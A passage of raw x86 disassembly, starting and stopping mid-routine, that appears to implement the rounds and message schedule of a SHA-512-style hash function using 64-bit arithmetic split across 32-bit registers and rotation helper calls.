xor esi ebp
mov ebp [ esp + 0x30 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x34 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x28 ]
and ebp eax
mov eax [ esp + 0x2c ]
and eax ecx
xor edx ebp
xor ebx eax
mov eax [ esp + 0xa4 ]
add esi edx
mov ebp [ eax ]
adc edi ebx
mov ebx [ eax + 0x4 ]
add esi ebp
adc edi ebx
mov eax [ esp + 0x90 ]
mov ebp [ esp + 0x44 ]
mov ebx [ esp + 0x20 ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x40 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x24 ]
adc esi edi
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x4c ]
mov [ esp + 0x24 ] esi
mov esi [ esp + 0x48 ]
mov [ esp + 0x20 ] ebx
mov ebx esi
mov ecx 0x1c
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x68 ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x60 ] ebx
mov ecx 0x1e
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x60 ]
mov esi [ esp + 0x68 ]
or ecx eax
mov eax [ esp + 0x48 ]
or ebx edx
xor ebp ecx
xor esi ebx
mov edx edi
mov ecx 0x19
xor ebx ebx
shr edi 0x7
call sub_1006b020
mov ecx [ esp + 0xa0 ]
or edi eax
mov eax [ esp + 0x9c ]
or ebx edx
mov edx [ esp + 0x4c ]
xor ebp edi
mov edi [ esp + 0x48 ]
xor esi ebx
mov ebx [ esp + 0x94 ]
and eax edi
mov edi [ esp + 0x98 ]
and ecx edx
mov edx [ esp + 0x8c ]
xor eax ebx
mov ebx [ esp + 0x18 ]
xor ecx edi
mov edi [ esp + 0x1c ]
add ebp eax
adc esi ecx
add ebp ebx
adc esi edi
add edx 0x2
and edx 0xf
mov [ esp + 0x40 ] ebp
mov [ esp + 0x44 ] esi
mov ecx [ esp + edx * 8 + 0xb4 ]
lea eax [ esp + edx * 8 + 0xb4 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x6c ] ecx
mov edx [ eax + 0x4 ]
mov eax [ esp + 0xac ]
mov [ esp + 0x70 ] edx
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx esi
mov ecx 0x13
mov eax esi
mov edx edi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
xor ebp ebp
shl ebx 0xd
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x68 ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x60 ] ebx
mov ecx 0x3
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x60 ]
mov esi [ esp + 0x68 ]
or ecx eax
mov eax [ esp + 0x80 ]
or ebx edx
xor ebp ecx
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
mov edi [ esp + 0x70 ]
xor esi edx
mov [ esp + 0x64 ] esi
mov esi [ esp + 0x6c ]
xor ebp eax
mov ebx esi
mov [ esp + 0x7c ] ebp
mov ecx 0x8
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x18
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x68 ] ebx
mov ebx esi
mov [ esp + 0x60 ] ebp
mov ecx 0x1
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x1f
call sub_1001d150
mov esi [ esp + 0x60 ]
mov edi [ esp + 0x68 ]
or ebp eax
mov eax [ esp + 0x6c ]
or ebx edx
mov edx [ esp + 0x70 ]
mov ecx 0x7
xor esi ebp
xor edi ebx
call sub_1001d150
mov ecx [ esp + 0x64 ]
xor edi edx
mov edx [ esp + 0x7c ]
xor esi eax
mov eax [ esp + 0xa8 ]
add edx esi
adc ecx edi
inc eax
and eax 0xf
add edx [ esp + eax * 8 + 0xb4 ]
mov ebx [ esp + eax * 8 + 0xb8 ]
mov eax [ esp + 0x14 ]
adc ecx ebx
mov edi [ eax ]
mov ebp [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
add edi edx
mov edx ebp
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov ecx 0x17
mov [ eax + 0x4 ] esi
mov esi ebp
mov eax ebx
xor edi edi
shr esi 0x9
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x64 ] eax
mov [ esp + 0x60 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x64 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x60 ]
or eax edx
mov edx [ esp + 0x24 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x24 ]
or ebp eax
mov eax [ esp + 0x20 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x28 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x2c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x38 ]
and ebp eax
mov eax [ esp + 0x3c ]
and eax ecx
xor edx ebp
xor ebx eax
mov eax [ esp + 0x90 ]
add esi edx
mov ebp [ eax + 0x8 ]
adc edi ebx
mov ebx [ eax + 0xc ]
mov eax [ esp + 0x14 ]
add esi ebp
mov ebp [ esp + 0x34 ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x30 ]
adc edi ebx
mov ebx [ esp + 0x50 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x54 ]
adc esi edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] esi
mov esi [ esp + 0x40 ]
mov edi [ esp + 0x44 ]
mov ebx esi
mov ecx 0x1c
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x64 ] ebx
mov ecx 0x1e
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x64 ]
mov esi [ esp + 0x60 ]
or ecx eax
mov eax [ esp + 0x40 ]
or ebx edx
xor ebp ecx
xor esi ebx
mov edx edi
mov ecx 0x19
xor ebx ebx
shr edi 0x7
call sub_1006b020
mov ecx [ esp + 0x58 ]
or edi eax
mov eax [ esp + 0x40 ]
or ebx edx
mov edx eax
xor ebp edi
xor edx ecx
mov ecx [ esp + 0x44 ]
xor esi ebx
mov ebx [ esp + 0x5c ]
mov edi ecx
xor edi ebx
mov ebx [ esp + 0x48 ]
and edx ebx
mov ebx [ esp + 0x4c ]
and edi ebx
mov ebx [ esp + 0x58 ]
and eax ebx
mov ebx [ esp + 0x5c ]
and ecx ebx
mov ebx [ esp + 0x18 ]
xor edx eax
mov eax [ esp + 0x8c ]
xor edi ecx
add ebp edx
adc esi edi
mov edi [ esp + 0x1c ]
add ebp ebx
adc esi edi
add eax 0x3
and eax 0xf
mov [ esp + 0x34 ] esi
mov [ esp + 0x30 ] ebp
xor ebp ebp
mov ecx [ esp + eax * 8 + 0xb4 ]
mov edx [ esp + eax * 8 + 0xb8 ]
lea eax [ esp + eax * 8 + 0xb4 ]
mov [ esp + 0x6c ] ecx
mov [ esp + 0xa8 ] eax
mov eax [ esp + 0xa4 ]
mov [ esp + 0x70 ] edx
mov ecx 0x13
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx esi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
mov eax esi
shl ebx 0xd
mov edx edi
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x64 ] ebx
mov ecx 0x3
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x64 ]
mov esi [ esp + 0x60 ]
or ecx eax
mov eax [ esp + 0x80 ]
or ebx edx
xor ebp ecx
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
mov edi [ esp + 0x70 ]
xor esi edx
mov [ esp + 0x7c ] esi
mov esi [ esp + 0x6c ]
xor ebp eax
mov ebx esi
mov [ esp + 0x68 ] ebp
mov ecx 0x8
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x18
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx esi
mov [ esp + 0x64 ] ebp
mov ecx 0x1
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x1f
call sub_1001d150
mov esi [ esp + 0x64 ]
mov edi [ esp + 0x60 ]
or ebp eax
mov eax [ esp + 0x6c ]
or ebx edx
mov edx [ esp + 0x70 ]
mov ecx 0x7
xor esi ebp
xor edi ebx
call sub_1001d150
mov ecx [ esp + 0x7c ]
xor edi edx
mov edx [ esp + 0x68 ]
xor esi eax
mov eax [ esp + 0x8c ]
add edx esi
adc ecx edi
add eax 0xfffffffb
and eax 0xf
mov ebp [ esp + eax * 8 + 0xb4 ]
add edx ebp
mov ebp [ esp + 0x54 ]
mov ebx [ esp + eax * 8 + 0xb8 ]
mov eax [ esp + 0x10 ]
adc ecx ebx
mov edi [ eax ]
add edi edx
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov [ eax + 0x4 ] esi
mov esi ebp
shr esi 0x9
xor edi edi
mov ebx [ esp + 0x50 ]
mov ecx 0x17
mov eax ebx
mov edx ebp
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x64 ] eax
mov [ esp + 0x60 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x64 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x60 ]
or eax edx
mov edx [ esp + 0x54 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x54 ]
or ebp eax
mov eax [ esp + 0x50 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x38 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x3c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x20 ]
and ebp eax
mov eax [ esp + 0x24 ]
and eax ecx
xor edx ebp
xor ebx eax
mov eax [ esp + 0x90 ]
add esi edx
mov ebp [ eax + 0x10 ]
adc edi ebx
mov ebx [ eax + 0x14 ]
mov eax [ esp + 0x10 ]
add esi ebp
mov ebp [ esp + 0x2c ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x28 ]
adc edi ebx
mov ebx [ esp + 0x58 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x5c ]
adc esi edi
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x34 ]
mov [ esp + 0x5c ] esi
mov esi [ esp + 0x30 ]
mov [ esp + 0x58 ] ebx
mov ebx esi
mov ecx 0x1c
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x64 ] ebx
mov ecx 0x1e
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x64 ]
mov esi [ esp + 0x60 ]
or ecx eax
mov eax [ esp + 0x30 ]
or ebx edx
xor ebp ecx
xor esi ebx
mov edx edi
mov ecx 0x19
xor ebx ebx
shr edi 0x7
call sub_1006b020
mov ecx [ esp + 0x30 ]
or edi eax
mov eax [ esp + 0x40 ]
or ebx edx
mov edx eax
xor ebp edi
xor edx ecx
mov ecx [ esp + 0x44 ]
xor esi ebx
mov ebx [ esp + 0x34 ]
mov edi ecx
xor edi ebx
mov ebx [ esp + 0x48 ]
and edx ebx
mov ebx [ esp + 0x4c ]
and edi ebx
mov ebx [ esp + 0x30 ]
and eax ebx
mov ebx [ esp + 0x34 ]
and ecx ebx
mov ebx [ esp + 0x18 ]
xor edx eax
mov eax [ esp + 0x8c ]
xor edi ecx
add ebp edx
adc esi edi
mov edi [ esp + 0x1c ]
add ebp ebx
adc esi edi
add eax 0x4
and eax 0xf
mov [ esp + 0x2c ] esi
mov [ esp + 0x28 ] ebp
xor ebp ebp
mov ecx [ esp + eax * 8 + 0xb4 ]
mov edx [ esp + eax * 8 + 0xb8 ]
lea eax [ esp + eax * 8 + 0xb4 ]
mov [ esp + 0x6c ] ecx
mov [ esp + 0xa4 ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x70 ] edx
mov ecx 0x13
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx esi
mov eax esi
mov edx edi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
shl ebx 0xd
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x64 ] ebx
xor ebx ebx
mov ecx 0x3
mov eax esi
mov edx edi
call sub_1006b020
mov ecx [ esp + 0x64 ]
mov esi [ esp + 0x60 ]
or ecx eax
mov eax [ esp + 0x80 ]
or ebx edx
xor ebp ecx
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
mov edi [ esp + 0x70 ]
xor esi edx
mov [ esp + 0x7c ] esi
mov esi [ esp + 0x6c ]
xor ebp eax
mov ebx esi
mov [ esp + 0x68 ] ebp
mov ecx 0x8
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x18
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx esi
mov [ esp + 0x64 ] ebp
mov ecx 0x1
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x1f
call sub_1001d150
mov esi [ esp + 0x64 ]
mov edi [ esp + 0x60 ]
or ebp eax
mov eax [ esp + 0x6c ]
or ebx edx
mov edx [ esp + 0x70 ]
mov ecx 0x7
xor esi ebp
xor edi ebx
call sub_1001d150
mov ecx [ esp + 0x7c ]
xor edi edx
mov edx [ esp + 0x68 ]
xor esi eax
mov eax [ esp + 0x8c ]
add edx esi
adc ecx edi
add eax 0xfffffffc
and eax 0xf
mov ebp [ esp + eax * 8 + 0xb4 ]
add edx ebp
mov ebp [ esp + 0x5c ]
mov ebx [ esp + eax * 8 + 0xb8 ]
mov eax [ esp + 0xa8 ]
adc ecx ebx
mov ebx [ esp + 0x58 ]
mov edi [ eax ]
add edi edx
mov edx ebp
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov ecx 0x17
mov [ eax + 0x4 ] esi
mov esi ebp
mov eax ebx
xor edi edi
shr esi 0x9
call sub_1006b020
or esi eax
or edi edx
mov edx ebx
xor eax eax
shl edx 0xe
mov [ esp + 0x64 ] eax
mov [ esp + 0x60 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x64 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x60 ]
or eax edx
mov edx [ esp + 0x5c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x5c ]
or ebp eax
mov eax [ esp + 0x58 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x20 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x24 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x50 ]
and ebp eax
mov eax [ esp + 0x54 ]
and eax ecx
xor edx ebp
xor ebx eax
mov eax [ esp + 0x90 ]
add esi edx
mov ebp [ eax + 0x18 ]
adc edi ebx
mov ebx [ eax + 0x1c ]
mov eax [ esp + 0xa8 ]
add esi ebp
mov ebp [ esp + 0x3c ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x38 ]
adc edi ebx
mov ebx [ esp + 0x48 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x4c ]
adc esi edi
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x2c ]
mov [ esp + 0x4c ] esi
mov esi [ esp + 0x28 ]
mov [ esp + 0x48 ] ebx
mov ebx esi
mov ecx 0x1c
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x64 ] ebx
xor ebx ebx
mov ecx 0x1e
mov eax esi
mov edx edi
call sub_1006b020
mov ecx [ esp + 0x64 ]
mov esi [ esp + 0x60 ]
or ecx eax
mov eax [ esp + 0x28 ]
or ebx edx
xor ebp ecx
xor esi ebx
mov edx edi
mov ecx 0x19
xor ebx ebx
shr edi 0x7
call sub_1006b020
mov ecx [ esp + 0x28 ]
or edi eax
mov eax [ esp + 0x30 ]
or ebx edx
mov edx eax
xor ebp edi
xor edx ecx
mov ecx [ esp + 0x34 ]
xor esi ebx
mov ebx [ esp + 0x2c ]
mov edi ecx
xor edi ebx
mov ebx [ esp + 0x40 ]
and edx ebx
mov ebx [ esp + 0x44 ]
and edi ebx
mov ebx [ esp + 0x28 ]
and eax ebx
mov ebx [ esp + 0x2c ]
and ecx ebx
mov ebx [ esp + 0x18 ]
xor edx eax
mov eax [ esp + 0x8c ]
xor edi ecx
add ebp edx
adc esi edi
mov edi [ esp + 0x1c ]
add ebp ebx
adc esi edi
add eax 0x5
and eax 0xf
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebp
xor ebp ebp
mov ecx [ esp + eax * 8 + 0xb4 ]
mov edx [ esp + eax * 8 + 0xb8 ]
lea eax [ esp + eax * 8 + 0xb4 ]
mov [ esp + 0x6c ] ecx
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x70 ] edx
mov ecx 0x13
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx esi
mov eax esi
mov edx edi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
shl ebx 0xd
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x64 ] ebx
mov ecx 0x3
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x64 ]
mov esi [ esp + 0x60 ]
or ecx eax
or ebx edx
xor ebp ecx
mov eax [ esp + 0x80 ]
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
mov edi [ esp + 0x70 ]
xor esi edx
mov [ esp + 0x7c ] esi
mov esi [ esp + 0x6c ]
xor ebp eax
mov ebx esi
mov [ esp + 0x68 ] ebp
mov ecx 0x8
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x18
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x60 ] ebx
mov ebx esi
mov [ esp + 0x64 ] ebp
mov ecx 0x1
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x1f
call sub_1001d150
mov esi [ esp + 0x64 ]
mov edi [ esp + 0x60 ]
or ebp eax
mov eax [ esp + 0x6c ]
or ebx edx
mov edx [ esp + 0x70 ]
mov ecx 0x7
xor esi ebp
xor edi ebx
call sub_1001d150
mov ecx [ esp + 0x7c ]
xor esi eax
mov eax [ esp + 0x74 ]
xor edi edx
mov edx [ esp + 0x68 ]
mov ebp [ eax ]
mov ebx [ eax + 0x4 ]
mov eax [ esp + 0xa4 ]
add edx esi
adc ecx edi
add edx ebp
mov edi [ eax ]
mov ebp [ esp + 0x4c ]
adc ecx ebx
mov ebx [ esp + 0x48 ]
add edi edx
mov edx ebp
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov ecx 0x17
mov [ eax + 0x4 ] esi
mov esi ebp
mov eax ebx
xor edi edi
shr esi 0x9
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x74 ] eax
mov [ esp + 0x64 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x74 ]
or ecx eax
mov eax [ esp + 0x64 ]
or eax edx
mov edx [ esp + 0x4c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
xor ebp ebp
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x4c ]
or ebp eax
mov eax [ esp + 0x48 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x50 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x54 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x58 ]
and eax ebp
mov ebp [ esp + 0x5c ]
and ecx ebp
xor edx eax
mov eax [ esp + 0x90 ]
xor ebx ecx
add esi edx
mov ebp [ eax + 0x20 ]
adc edi ebx
mov ebx [ eax + 0x24 ]
mov eax [ esp + 0xa4 ]
add esi ebp
mov ebp [ esp + 0x24 ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x20 ]
adc edi ebx
mov ebx [ esp + 0x40 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x44 ]
adc esi edi
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x3c ]
mov [ esp + 0x44 ] esi
mov esi [ esp + 0x38 ]
mov [ esp + 0x40 ] ebx
mov ebx esi
mov ecx 0x1c
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x64 ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x74 ] ebx
mov ecx 0x1e
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x74 ]
mov esi [ esp + 0x64 ]
or ecx eax
or ebx edx
mov edx edi
xor ebp ecx
xor esi ebx
shr edi 0x7
xor ebx ebx
mov eax [ esp + 0x38 ]
mov ecx 0x19
call sub_1006b020
mov ecx [ esp + 0x3c ]
or edi eax
mov eax [ esp + 0x38 ]
or ebx edx
mov edx [ esp + 0x28 ]
xor ebp edi
xor esi ebx
mov ebx [ esp + 0x2c ]
mov edi edx
xor ebx ecx
and ebx [ esp + 0x34 ]
xor edi eax
and edi [ esp + 0x30 ]
and edx eax
mov eax [ esp + 0x2c ]
and eax ecx
xor edi edx
mov ecx [ esp + 0x8c ]
xor ebx eax
add ebp edi
mov edi [ esp + 0x1c ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add ebp ebx
adc esi edi
add ecx 0x6
and ecx 0xf
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] ebp
xor ebp ebp
mov edx [ esp + ecx * 8 + 0xb4 ]
lea eax [ esp + ecx * 8 + 0xb4 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x6c ] edx
mov eax [ eax + 0x4 ]
mov ecx 0x13
mov [ esp + 0x70 ] eax
mov eax [ esp + 0xa8 ]
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx esi
mov eax esi
mov edx edi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
shl ebx 0xd
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x64 ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x74 ] ebx
mov ecx 0x3
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x74 ]
mov esi [ esp + 0x64 ]
or ecx eax
mov eax [ esp + 0x80 ]
or ebx edx
xor ebp ecx
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
xor esi edx
xor ebp eax
mov [ esp + 0x68 ] esi
mov esi [ esp + 0x6c ]
mov [ esp + 0x60 ] ebp
mov ebx esi
xor ebp ebp
mov ecx 0x8
shl ebx 0x18
mov eax esi
mov edi [ esp + 0x70 ]
mov edx edi
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x64 ] ebx
mov ebx esi
mov [ esp + 0x74 ] ebp
mov ecx 0x1
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x1f
call sub_1001d150
mov esi [ esp + 0x74 ]
mov edi [ esp + 0x64 ]
or ebp eax
mov eax [ esp + 0x6c ]
or ebx edx
mov edx [ esp + 0x70 ]
mov ecx 0x7
xor esi ebp
xor edi ebx
call sub_1001d150
mov ecx [ esp + 0x68 ]
xor esi eax
mov eax [ esp + 0x88 ]
xor edi edx
mov edx [ esp + 0x60 ]
mov ebp [ eax ]
mov ebx [ eax + 0x4 ]
mov eax [ esp + 0x14 ]
add edx esi
adc ecx edi
add edx ebp
mov edi [ eax ]
mov ebp [ esp + 0x44 ]
adc ecx ebx
mov ebx [ esp + 0x40 ]
add edi edx
mov edx ebp
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov ecx 0x17
mov [ eax + 0x4 ] esi
mov esi ebp
mov eax ebx
xor edi edi
shr esi 0x9
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x88 ] eax
mov [ esp + 0x74 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x88 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x74 ]
or eax edx
mov edx [ esp + 0x44 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
or ebp eax
mov eax [ esp + 0x40 ]
or ebx edx
mov edx eax
xor esi ebp
xor edi ebx
not edx
mov ecx [ esp + 0x44 ]
mov ebp [ esp + 0x58 ]
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x5c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x48 ]
and ebp eax
mov eax [ esp + 0x4c ]
and eax ecx
xor edx ebp
xor ebx eax
mov eax [ esp + 0x90 ]
add esi edx
mov ebp [ eax + 0x28 ]
adc edi ebx
mov ebx [ eax + 0x2c ]
mov eax [ esp + 0x14 ]
add esi ebp
mov ebp [ esp + 0x54 ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x50 ]
adc edi ebx
mov ebx [ esp + 0x30 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x34 ]
adc esi edi
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x24 ]
mov [ esp + 0x34 ] esi
mov esi [ esp + 0x20 ]
mov [ esp + 0x30 ] ebx
mov ebx esi
mov ecx 0x1c
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x74 ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x88 ] ebx
mov ecx 0x1e
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x88 ]
mov esi [ esp + 0x74 ]
or ecx eax
mov eax [ esp + 0x20 ]
or ebx edx
xor ebp ecx
xor esi ebx
mov edx edi
mov ecx 0x19
xor ebx ebx
shr edi 0x7
call sub_1006b020
mov ecx [ esp + 0x20 ]
or edi eax
mov eax [ esp + 0x38 ]
or ebx edx
mov edx eax
xor ebp edi
xor edx ecx
mov ecx [ esp + 0x3c ]
xor esi ebx
mov ebx [ esp + 0x24 ]
mov edi ecx
xor edi ebx
mov ebx [ esp + 0x28 ]
and edx ebx
mov ebx [ esp + 0x2c ]
and edi ebx
mov ebx [ esp + 0x20 ]
and eax ebx
mov ebx [ esp + 0x24 ]
and ecx ebx
mov ebx [ esp + 0x18 ]
xor edx eax
mov eax [ esp + 0x8c ]
xor edi ecx
add ebp edx
adc esi edi
mov edi [ esp + 0x1c ]
add ebp ebx
adc esi edi
add eax 0x7
and eax 0xf
mov [ esp + 0x54 ] esi
mov [ esp + 0x50 ] ebp
xor ebp ebp
mov ecx [ esp + eax * 8 + 0xb4 ]
mov [ esp + 0x6c ] ecx
mov ecx 0x13
mov edx [ esp + eax * 8 + 0xb8 ]
mov eax [ esp + 0xa4 ]
mov [ esp + 0x70 ] edx
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx esi
mov eax esi
mov edx edi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
shl ebx 0xd
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x74 ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x88 ] ebx
mov ecx 0x3
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x88 ]
mov esi [ esp + 0x74 ]
or ecx eax
mov eax [ esp + 0x80 ]
or ebx edx
xor ebp ecx
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
mov edi [ esp + 0x70 ]
xor esi edx
mov [ esp + 0x60 ] esi
mov esi [ esp + 0x6c ]
xor ebp eax
mov ebx esi
mov [ esp + 0x64 ] ebp
mov ecx 0x8
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x18
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x74 ] ebx
mov ebx esi
mov [ esp + 0x88 ] ebp
xor ebp ebp
shl ebx 0x1f
mov ecx 0x1
mov eax esi
mov edx edi
call sub_1001d150
mov esi [ esp + 0x88 ]
